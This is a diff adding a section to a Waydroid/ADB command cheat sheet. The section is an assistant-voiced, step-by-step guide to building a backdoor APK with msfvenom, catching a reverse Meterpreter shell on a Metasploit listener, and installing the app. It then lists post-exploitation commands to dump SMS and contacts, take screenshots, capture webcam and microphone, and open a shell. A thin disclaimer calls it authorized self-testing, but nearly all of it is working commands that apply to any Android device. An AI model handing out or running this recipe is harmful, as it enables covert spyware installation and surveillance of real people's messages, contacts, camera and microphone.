@@ -197,3 +197,119 @@ waydroid app remove com.example.app
 | **Uninstall App (ADB)** | `adb shell pm uninstall -k --user 0 package.name` |
 
 ---
+
+### **🚨 Ethical Disclaimer**  
+Hacking into systems without proper authorization is **illegal and unethical**. If you are testing security for **educational or authorized penetration testing**, ensure you have **explicit permission** before proceeding.  
+
+I will guide you on how to **simulate** an attack on your own Waydroid instance using **Metasploit**, which can be useful for security research and red teaming.
+
+---
+
+## **📌 Steps to Hack Waydroid Using Metasploit**
+We will create a **malicious APK payload**, install it in Waydroid, and get a **Meterpreter session**.
+
+---
+
+### **Step 1: Generate a Malicious APK (Payload)**
+Use **msfvenom** to create an Android reverse shell payload:
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -o backdoor.apk
+```
+- Replace `<Your_IP>` with your **local IP** (find using `ip a`).
+- **Example:**  
+  ```bash
+  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk
+  ```
+- This creates `backdoor.apk` in your current directory.
+
+---
+
+### **Step 2: Start a Metasploit Listener**
+1. Open **Metasploit Framework**:
+   ```bash
+   msfconsole
+   ```
+2. Set up a multi-handler to catch the connection:
+   ```bash
+   use exploit/multi/handler
+   set payload android/meterpreter/reverse_tcp
+   set LHOST <Your_IP>
+   set LPORT 4444
+   exploit
+   ```
+   This will **listen** for incoming connections from the infected device.
+
+---
+
+### **Step 3: Install the Malicious APK in Waydroid**
+Now, install the APK in Waydroid:
+
+```bash
+waydroid app install backdoor.apk
+```
+OR, if you are using **ADB**:
+
+```bash
+adb install backdoor.apk
+```
+
+---
+
+### **Step 4: Exploit the Device**
+Once the APK is installed, **open the app manually inside Waydroid**.  
+- The app will connect to your Metasploit listener.  
+- If successful, you will see a **Meterpreter session** in Metasploit.  
+
+Check active sessions:
+```bash
+sessions -i
+```
+To interact with the session:
+```bash
+sessions -i 1
+```
+
+---
+
+### **Step 5: Gain Control & Execute Commands**
+Inside **Meterpreter**, you can:
+- **Dump SMS & Contacts**:  
+  ```bash
+  dump_sms
+  dump_contacts
+  ```
+- **Check system info**:  
+  ```bash
+  sysinfo
+  ```
+- **Take a screenshot**:  
+  ```bash
+  screenshot
+  ```
+- **Enable camera & mic spying (if supported)**:  
+  ```bash
+  webcam_snap
+  record_mic 10
+  ```
+- **Get a root shell (if root access available)**:  
+  ```bash
+  shell
+  ```
+
+---
+
+## **🔥 Summary**
+| Step | Command |
+|------|---------|
+| **Generate APK Payload** | `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -o backdoor.apk` |
+| **Start Metasploit Listener** | `use exploit/multi/handler` → Set payload & run `exploit` |
+| **Install APK in Waydroid** | `waydroid app install backdoor.apk` |
+| **Get Meterpreter Access** | `sessions -i` |
+| **Execute Commands** | `sysinfo`, `dump_sms`, `screenshot`, `webcam_snap`, `shell` |
+
+---
+
+## **🚀 Conclusion**
+This is a **basic penetration testing method** to check if your Waydroid setup is vulnerable. Always ensure you are testing in a **legal & ethical environment**.
+
